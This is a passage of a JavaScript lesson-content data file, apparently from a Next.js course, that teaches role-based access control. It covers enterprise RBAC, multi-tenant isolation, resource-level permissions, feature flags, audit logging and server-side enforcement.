            language: "javascript",
            content: `if (role === "admin")`
          },
          {
            type: "paragraph",
            content: "Prefer:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (user.can("delete_post"))`
          },
          {
            type: "paragraph",
            content: "Permission-based systems scale better as applications grow."
          },
          {
            type: "paragraph",
            content: "4. Never Trust the Client"
          },
          {
            type: "paragraph",
            content: "Buttons can be hidden or disabled in the UI, but every sensitive operation must still be validated on the server."
          },
          {
            type: "paragraph",
            content: "5. Protect Every Entry Point"
          },
          {
            type: "paragraph",
            content: "Secure:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Pages",
              "Layouts",
              "Server Components",
              "Route Handlers",
              "Server Actions",
              "API Routes",
              "Database queries"
            ]
          },
          {
            type: "paragraph",
            content: "Missing even one layer can expose sensitive functionality."
          },
          {
            type: "paragraph",
            content: "6. Apply the Principle of Least Privilege"
          },
          {
            type: "paragraph",
            content: "Grant users only the permissions they actually need."
          },
          {
            type: "paragraph",
            content: "For example, an editor should not automatically inherit administrative privileges."
          },
          {
            type: "paragraph",
            content: "7. Use Centralized Authorization Helpers"
          },
          {
            type: "paragraph",
            content: "Instead of repeating permission logic everywhere:"
          },
          {
            type: "code",
            language: "javascript",
            content: `await requireRole("admin")`
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "code",
            language: "javascript",
            content: `await requirePermission("edit_post")`
          },
          {
            type: "paragraph",
            content: "This keeps authorization consistent and easier to maintain."
          },
          {
            type: "paragraph",
            content: "8. Log Authorization Failures"
          },
          {
            type: "paragraph",
            content: "Record failed authorization attempts for auditing, security monitoring, and incident investigation."
          },
          {
            type: "paragraph",
            content: "9. Plan for Future Growth"
          },
          {
            type: "paragraph",
            content: "Design your authorization model so new roles and permissions can be added without rewriting large portions of the application."
          },
          {
            type: "paragraph",
            content: "10. Review Permissions Regularly"
          },
          {
            type: "paragraph",
            content: "As features evolve, remove obsolete permissions and verify that existing roles still match business requirements."
          },
          {
            type: "divider"
          }
        ]
      },

      {
        heading: "Role-Based Access Control (RBAC) — Part 4",
        blocks: [
          {
            type: "paragraph",
            content: "Enterprise RBAC, Multi-Tenant Authorization, Dynamic Permissions, Feature Flags, Auditing, Security, Performance & Production Architecture"
          },
          {
            type: "paragraph",
            content: "Goal: Learn how RBAC is implemented in real production applications, how enterprise companies scale authorization systems, and how to design a secure, maintainable permission architecture in Next.js."
          }
        ]
      },
      {
        heading: "Introduction",
        blocks: [
          {
            type: "paragraph",
            content: "In the previous lesson, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Users",
              "Roles",
              "Permissions",
              "Role Hierarchies",
              "Database Design",
              "JWT Roles",
              "NextAuth Integration",
              "Middleware Protection"
            ]
          },
          {
            type: "paragraph",
            content: "Those concepts are enough for small applications."
          },
          {
            type: "paragraph",
            content: "However..."
          },
          {
            type: "paragraph",
            content: "Companies like Google, Microsoft, GitHub, Stripe, Shopify, AWS, Slack, Discord, Atlassian, Notion, Salesforce, and Vercel operate with millions of users, thousands of permissions, multiple organizations, and hundreds of internal services."
          },
          {
            type: "paragraph",
            content: "Simple RBAC quickly becomes insufficient."
          },
          {
            type: "paragraph",
            content: "This lesson focuses on production-grade authorization architecture used in enterprise software."
          }
        ]
      },
      {
        heading: "Why Basic RBAC Eventually Breaks",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an application with only three roles:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Admin",
              "Editor",
              "User"
            ]
          },
          {
            type: "paragraph",
            content: "Everything looks simple."
          },
          {
            type: "paragraph",
            content: "Now imagine your company grows."
          },
          {
            type: "paragraph",
            content: "You now have:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "HR Admin",
              "Finance Admin",
              "Sales Manager",
              "Engineering Manager",
              "Support Agent",
              "Customer",
              "Vendor",
              "Partner",
              "Auditor",
              "Compliance Officer",
              "Regional Admin",
              "Super Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Soon there are:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "50+ roles",
              "200+ permissions",
              "Thousands of employees"
            ]
          },
          {
            type: "paragraph",
            content: "Problems appear:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "duplicated permissions",
              "impossible role management",
              "difficult onboarding",
              "security mistakes",
              "inconsistent access"
            ]
          },
          {
            type: "paragraph",
            content: "This is where enterprise RBAC begins."
          }
        ]
      },
      {
        heading: "Admin Dashboards",
        blocks: [
          {
            type: "paragraph",
            content: "Most business software contains an administration panel."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Shopify Admin",
              "Stripe Dashboard",
              "GitHub Organization Settings",
              "AWS Console",
              "Vercel Dashboard",
              "Firebase Console"
            ]
          },
          {
            type: "paragraph",
            content: "Admin dashboards require many permission levels."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "tree",
            content: `Dashboard

├── Users
├── Orders
├── Payments
├── Products
├── Coupons
├── Analytics
├── Inventory
├── Reports
├── Settings
└── Billing`
          },
          {
            type: "paragraph",
            content: "Every section may require different permissions."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Admin\n✓ Everything",
              "Support Agent\n✓ Orders\n✓ Customers\n✗ Billing",
              "Marketing\n✓ Coupons\n✓ Analytics\n✗ Inventory",
              "Finance\n✓ Payments\n✓ Billing\n✗ Products"
            ]
          },
          {
            type: "paragraph",
            content: "This is impossible with only three roles."
          }
        ]
      },
      {
        heading: "Designing Admin Permissions",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of roles controlling everything directly..."
          },
          {
            type: "paragraph",
            content: "Large applications use permissions."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "products.read",
              "products.create",
              "products.update",
              "products.delete",
              "orders.read",
              "orders.update",
              "orders.cancel",
              "payments.read",
              "payments.refund",
              "analytics.read",
              "billing.update"
            ]
          },
          {
            type: "paragraph",
            content: "Roles simply become collections of permissions."
          },
          {
            type: "flow",
            steps: [
              "Admin", "→",
              "Has", "→",
              "150 permissions"
            ]
          },
          {
            type: "flow",
            steps: [
              "Support", "→",
              "Has", "→",
              "25 permissions"
            ]
          },
          {
            type: "paragraph",
            content: "Much easier to maintain."
          }
        ]
      },
      {
        heading: "Enterprise RBAC",
        blocks: [
          {
            type: "paragraph",
            content: "Enterprise applications rarely stop at roles."
          },
          {
            type: "paragraph",
            content: "Instead they implement multiple authorization layers."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Role", "→",
              "Permission", "→",
              "Organization", "→",
              "Department", "→",
              "Project", "→",
              "Resource"
            ]
          },
          {
            type: "paragraph",
            content: "Access is checked through all these layers."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "flow",
            steps: [
              "Can Alice edit invoice #105?", "→",
              "Authenticated?", "→",
              "Organization member?", "→",
              "Finance department?", "→",
              "Invoice owner?", "→",
              "Has update permission?", "→",
              "Allowed"
            ]
          },
          {
            type: "paragraph",
            content: "Authorization becomes a decision pipeline."
          }
        ]
      },
      {
        heading: "Multi-Tenant RBAC",
        blocks: [
          {
            type: "paragraph",
            content: "Many SaaS applications are multi-tenant."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Slack",
              "Notion",
              "GitHub",
              "Vercel",
              "Figma",
              "Linear",
              "ClickUp"
            ]
          },
          {
            type: "paragraph",
            content: "Every customer owns an isolated workspace."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Company A\nUsers\nProjects\nRoles\nPermissions"
            ]
          },
          {
            type: "paragraph",
            content: "Completely separated from"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Company B\nUsers\nProjects\nRoles\nPermissions"
            ]
          },
          {
            type: "paragraph",
            content: "One company's admin should never access another company's data."
          }
        ]
      },
      {
        heading: "Multi-Tenant Database Example",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Users",
              "Projects"
            ]
          },
          {
            type: "paragraph",
            content: "Store"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Organizations",
              "Users",
              "OrganizationMembers",
              "Roles",
              "Permissions",
              "Projects"
            ]
          },
          {
            type: "paragraph",
            content: "Projects include"
          },
          {
            type: "output",
            content: [
              "organizationId"
            ]
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Project",
              "id",
              "organizationId",
              "ownerId",
              "title"
            ]
          },
          {
            type: "paragraph",
            content: "Every query automatically filters by"
          },
          {
            type: "output",
            content: [
              "organizationId"
            ]
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "code",
            language: "javascript",
            content: `await prisma.project.findMany({
  where: {
    organizationId: session.organizationId
  }
})`
          },
          {
            type: "paragraph",
            content: "This is one of the most important production security practices."
          }
        ]
      },
      {
        heading: "Dynamic Permissions",
        blocks: [
          {
            type: "paragraph",
            content: "Basic RBAC uses predefined permissions."
          },
          {
            type: "paragraph",
            content: "Enterprise applications often generate permissions dynamically."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "paragraph",
            content: "Instead of"
          },
          {
            type: "output",
            content: [
              "products.update"
            ]
          },
          {
            type: "paragraph",
            content: "the permission becomes"
          },
          {
            type: "output",
            content: [
              "products.update.102"
            ]
          },
          {
            type: "paragraph",
            content: "Meaning"
          },
          {
            type: "output",
            content: [
              "Update Product #102 only"
            ]
          },
          {
            type: "paragraph",
            content: "Or"
          },
          {
            type: "output",
            content: [
              "project.manage.5001"
            ]
          },
          {
            type: "paragraph",
            content: "Meaning"
          },
          {
            type: "output",
            content: [
              "Manage Project 5001 only"
            ]
          },
          {
            type: "paragraph",
            content: "This enables resource-level authorization."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Alice owns Project A",
              "Bob owns Project B"
            ]
          },
          {
            type: "paragraph",
            content: "Alice cannot edit Bob's project despite having"
          },
          {
            type: "output",
            content: [
              "project.update"
            ]
          },
          {
            type: "paragraph",
            content: "The authorization system also checks ownership."
          },
          {
            type: "code",
            language: "javascript",
            content: `project.ownerId === user.id`
          }
        ]
      },
      {
        heading: "Feature Flags",
        blocks: [
          {
            type: "paragraph",
            content: "Large companies release features gradually."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "New Dashboard",
              "AI Assistant",
              "Dark Mode",
              "Analytics V2",
              "New Billing"
            ]
          },
          {
            type: "paragraph",
            content: "Not every user receives every feature."
          },
          {
            type: "paragraph",
            content: "Instead,"
          },
          {
            type: "flow",
            steps: [
              "Feature Flags", "→",
              "Enable features dynamically"
            ]
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "flow",
            steps: [
              "Role", "→",
              "Admin", "→",
              "Feature", "→",
              "AI Assistant", "→",
              "Enabled"
            ]
          },
          {
            type: "paragraph",
            content: "Another user"
          },
          {
            type: "flow",
            steps: [
              "Standard User", "→",
              "Disabled"
            ]
          },
          {
            type: "paragraph",
            content: "Feature flags often work together with RBAC."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (
    user.permissions.includes("analytics.read") &&
    user.features.includes("analytics-v2")
) {
    showAnalytics()
}`
          },
          {
            type: "paragraph",
            content: "Permission decides"
          },
          {
            type: "output",
            content: [
              "Can access"
            ]
          },
          {
            type: "paragraph",
            content: "Feature flag decides"
          },
          {
            type: "output",
            content: [
              "Should currently see it"
            ]
          }
        ]
      },
      {
        heading: "Fine-Grained Permissions",
        blocks: [
          {
            type: "paragraph",
            content: "Small applications ask"
          },
          {
            type: "output",
            content: [
              "Can user edit?"
            ]
          },
          {
            type: "paragraph",
            content: "Enterprise applications ask"
          },
          {
            type: "output",
            content: [
              "Can user edit THIS field?",
              "Can edit salary?",
              "Can edit address?",
              "Can edit email?",
              "Can edit tax information?"
            ]
          },
          {
            type: "paragraph",
            content: "Permission granularity increases dramatically."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "employee.read",
              "employee.salary.read",
              "employee.salary.update",
              "employee.personal.read",
              "employee.personal.update"
            ]
          },
          {
            type: "paragraph",
            content: "Now access becomes extremely precise."
          }
        ]
      },
      {
        heading: "Auditing",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization is only half the story."
          },
          {
            type: "paragraph",
            content: "Companies also record:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Who accessed?",
              "When?",
              "What changed?",
              "From where?",
              "Why?"
            ]
          },
          {
            type: "paragraph",
            content: "This is called an audit trail."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "09:02",
              "Admin deleted Product #102",
              "IP:\n192.168.x.x",
              "Location:\nLondon",
              "Browser:\nChrome"
            ]
          },
          {
            type: "paragraph",
            content: "Large organizations legally require these logs."
          },
          {
            type: "paragraph",
            content: "Audit Table Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "AuditLog",
              "id",
              "userId",
              "action",
              "resource",
              "resourceId",
              "timestamp",
              "ip",
              "userAgent"
            ]
          },
          {
            type: "paragraph",
            content: "Example entry"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "UPDATE",
              "Product",
              "104",
              "2026-05-20",
              "Admin #15"
            ]
          }
        ]
      },
      {
        heading: "Logging Authorization Decisions",
        blocks: [
          {
            type: "paragraph",
            content: "Many developers log only successful actions."
          },
          {
            type: "paragraph",
            content: "Production systems also log failures."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "flow",
            steps: [
              "Unauthorized access", "→",
              "User", "→",
              "Permission requested", "→",
              "IP", "→",
              "Timestamp"
            ]
          },
          {
            type: "paragraph",
            content: "Useful for"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "intrusion detection",
              "security monitoring",
              "debugging",
              "compliance"
            ]
          }
        ]
      },
      {
        heading: "Security Considerations",
        blocks: [
          {
            type: "paragraph",
            content: "RBAC is useless if implemented incorrectly."
          },
          {
            type: "paragraph",
            content: "Never Trust the Client"
          },
          {
            type: "paragraph",
            content: "Wrong"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (user.role === "admin") {
    deleteProduct()
}`
          },
          {
            type: "paragraph",
            content: "inside React."
          },
          {
            type: "paragraph",
            content: "The user can modify JavaScript."
          },
          {
            type: "paragraph",
            content: "Correct"
          },
          {
            type: "paragraph",
            content: "Server verifies permissions."
          },
          {
            type: "flow",
            steps: [
              "Client", "→",
              "Request", "→",
              "Server", "→",
              "Permission Check", "→",
              "Database"
            ]
          },
          {
            type: "paragraph",
            content: "Always validate authorization on the server."
          },
          {
            type: "paragraph",
            content: "Never Hide Instead of Protect"
          },
          {
            type: "paragraph",
            content: "Wrong"
          },
          {
            type: "output",
            content: [
              "Hide Delete Button"
            ]
          },
          {
            type: "paragraph",
            content: "Users can still call the API manually."
          },
          {
            type: "paragraph",
            content: "Always verify permissions inside:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Server Actions",
              "Route Handlers",
              "API Routes",
              "Database layer"
            ]
          },
          {
            type: "paragraph",
            content: "Principle of Least Privilege"
          },
          {
            type: "paragraph",
            content: "Give users the minimum permissions required."
          },
          {
            type: "paragraph",
            content: "Instead of"
          },
          {
            type: "output",
            content: [
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "give"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "products.read",
              "products.update"
            ]
          },
          {
            type: "paragraph",
            content: "Only what they actually need."
          },
          {
            type: "paragraph",
            content: "Validate Every Request"
          },
          {
            type: "paragraph",
            content: "Never assume:"
          },
          {
            type: "output",
            content: [
              "Authenticated",
              "",
              "=",
              "",
              "Authorized"
            ]
          },
          {
            type: "paragraph",
            content: "Always check"
          },
          {
            type: "flow",
            steps: [
              "Session", "→",
              "Role", "→",
              "Permission", "→",
              "Ownership", "→",
              "Organization", "→",
              "Allowed?"
            ]
          },
          {
            type: "paragraph",
            content: "Every request."
          }
        ]
      },
      {
        heading: "Performance",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization runs frequently."
          },
          {
            type: "paragraph",
            content: "Imagine"
          },
          {
            type: "flow",
            steps: [
              "Every request", "→",
              "Database", "→",
              "Permissions query"
            ]
          },
          {
            type: "paragraph",
            content: "Thousands of requests become expensive."
          },
          {
            type: "paragraph",
            content: "Cache Permissions"
          },
          {
            type: "paragraph",
            content: "Instead of querying every request,"
          },
          {
            type: "paragraph",
            content: "Store permissions in"
          },
          {
            type: "output",
            content: [
              "JWT",
              "",
              "or",
              "",
              "Session"
            ]
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "flow",
            steps: [
              "JWT", "→",
              "roles", "→",
              "permissions"
            ]
          },
          {
            type: "paragraph",
            content: "Server reads them instantly."
          },
          {
            type: "paragraph",
            content: "Batch Permission Checks"
          },
          {
            type: "paragraph",
            content: "Instead of"
          },
          {
            type: "output",
            content: [
              "10 database queries"
            ]
          },
          {
            type: "paragraph",
            content: "Load permissions once."
          },
          {
            type: "paragraph",
            content: "Then"
          },
          {
            type: "output",
            content: [
              "Memory Lookup"
            ]
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "permissions.has(\"orders.read\")",
              "permissions.has(\"orders.update\")",
              "permissions.has(\"orders.delete\")"
            ]
          },
          {
            type: "paragraph",
            content: "Very fast."
          },
          {
            type: "paragraph",
            content: "Avoid Deep Role Chains"
          },
          {
            type: "paragraph",
            content: "Bad"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Role", "→",
              "Parent Role", "→",
              "Parent Role", "→",
              "Parent Role", "→",
              "Permission"
            ]
          },
          {
            type: "paragraph",
            content: "Permission lookup becomes slow."
          },
          {
            type: "paragraph",
            content: "Flatten permissions whenever possible."
          }
        ]
      },
      {
        heading: "Production RBAC Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "A common architecture for a large Next.js application:"
          },
          {
            type: "code",
            language: "text",
            content: `Browser
   │
   ▼
Middleware
   │
Authenticate Request
   │
   ▼
JWT / Session Verification
   │
   ▼
Load User Context
(User ID, Organization, Roles, Permissions)
   │
   ▼
Server Component / Route Handler / Server Action
   │
Authorization Service
   │
Permission Check
   │
Ownership Check
   │
Organization Check
   │
Feature Flag Check
   │
Audit Log
   │
   ▼
Database`
          },
          {
            type: "paragraph",
            content: "This separates authentication from authorization and keeps permission logic centralized."
          }
        ]
      },
      {
        heading: "Production Best Practices",
        blocks: [
          {
            type: "paragraph",
            content: "1. Separate Authentication and Authorization"
          },
          {
            type: "paragraph",
            content: "Authentication answers:"
          },
          {
            type: "output",
            content: [
              "Who are you?"
            ]
          },
          {
            type: "paragraph",
            content: "Authorization answers:"
          },
          {
            type: "output",
            content: [
              "What may you do?"
            ]
          },
          {
            type: "paragraph",
            content: "Never mix them."
          },
          {
            type: "paragraph",
            content: "2. Centralize Permission Logic"
          },
          {
            type: "paragraph",
            content: "Instead of writing permission checks throughout your codebase:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (role === "admin") { ... }`
          },
          {
            type: "paragraph",
            content: "Create reusable helpers:"
          },
          {
            type: "code",
            language: "javascript",
            content: `await requirePermission("orders.update")`
          },
          {
            type: "paragraph",
            content: "One change updates behavior everywhere."
          },
          {
            type: "paragraph",
            content: "3. Use Permission Names Instead of Role Names"
          },
          {
            type: "paragraph",
            content: "Avoid:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (role === "manager")`
          },
          {
            type: "paragraph",
            content: "Prefer:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (permissions.has("orders.update"))`
          },
          {
            type: "paragraph",
            content: "Roles evolve; permissions are more stable."
          },
          {
            type: "paragraph",
            content: "4. Enforce Authorization on the Server"
          },
          {
            type: "paragraph",
            content: "UI restrictions improve UX but do not provide security. Every sensitive action must be validated in Server Actions, Route Handlers, or API Routes before touching the database."
          },
          {
            type: "paragraph",
            content: "5. Keep Audit Logs"
          },
          {
            type: "paragraph",
            content: "Log privileged operations such as:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User creation",
              "Role changes",
              "Permission updates",
              "Payment refunds",
              "Account deletion"
            ]
          },
          {
            type: "paragraph",
            content: "Audit trails simplify debugging and help satisfy compliance requirements."
          },
          {
            type: "paragraph",
            content: "6. Design for Growth"
          },
          {
            type: "paragraph",
            content: "Even if your application starts with three roles, structure it so that new roles and permissions can be added without rewriting the authorization system."
          }
        ]
      },
      {
        heading: "Common Mistakes",
        blocks: [
          {
            type: "paragraph",
            content: "Using Roles Everywhere"
          },
          {
            type: "paragraph",
            content: "Checking role === \"admin\" across dozens of files makes maintenance difficult. Use permission-based helpers instead."
          },
          {
            type: "paragraph",
            content: "Trusting Client-Side Checks"
          },
          {
            type: "paragraph",
            content: "Never rely on hidden buttons or disabled UI elements as security controls."
          },
          {
            type: "paragraph",
            content: "No Ownership Validation"
          },
          {
            type: "paragraph",
            content: "A user may have permission to edit their post but not another user's post. Always verify resource ownership."
          },
          {
            type: "paragraph",
            content: "Missing Tenant Isolation"
          },
          {
            type: "paragraph",
            content: "In SaaS platforms, forgetting to filter by organizationId can expose one customer's data to another."
          },
          {
            type: "paragraph",
            content: "Hardcoding Permissions"
          },
          {
            type: "paragraph",
            content: "Permissions should come from the database or configuration, not be scattered throughout the codebase as string literals."
          },
          {
            type: "paragraph",
            content: "Ignoring Audit Logs"
          },
          {
            type: "paragraph",
            content: "Without logs, investigating unauthorized changes or security incidents becomes much harder."
          }
        ]
      },
      {
        heading: "DevSphere Special Note",
        blocks: [
          {
            type: "note",
            content: "Many developers think RBAC is simply: if (role === \"admin\"). That works only for very small projects. Professional applications treat authorization as an independent subsystem with: Authentication, Permission management, Organization isolation, Resource ownership checks, Feature flags, Audit logging, Centralized policy evaluation, Performance optimization. As your application grows, the authorization system often becomes as important as the database schema itself. Investing in a clean RBAC architecture early will save countless hours of maintenance and reduce the risk of security vulnerabilities."
          }
        ]
      },
      {
        heading: "Summary",
        blocks: [
          {
            type: "paragraph",
            content: "In this lesson, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "How enterprise RBAC differs from basic role systems",
              "Designing permission-driven admin dashboards",
              "Multi-tenant authorization for SaaS applications",
              "Dynamic and resource-level permissions",
              "Integrating feature flags with RBAC",
              "Fine-grained permission models",
              "Audit logging and authorization monitoring",
              "Security principles such as least privilege and server-side enforcement",
              "Performance optimizations for permission checks",
              "Production-grade RBAC architecture",
              "Best practices and common implementation mistakes"
            ]
          },
          {
            type: "paragraph",
            content: "With this lesson, you now have a comprehensive understanding of Role-Based Access Control (RBAC) in modern Next.js applications—from simple role assignments to scalable enterprise authorization systems capable of supporting large, security-critical production environments."
          }
        ]
      }
    ]
  },
};

export default nextjsAuthenticationAuthorization;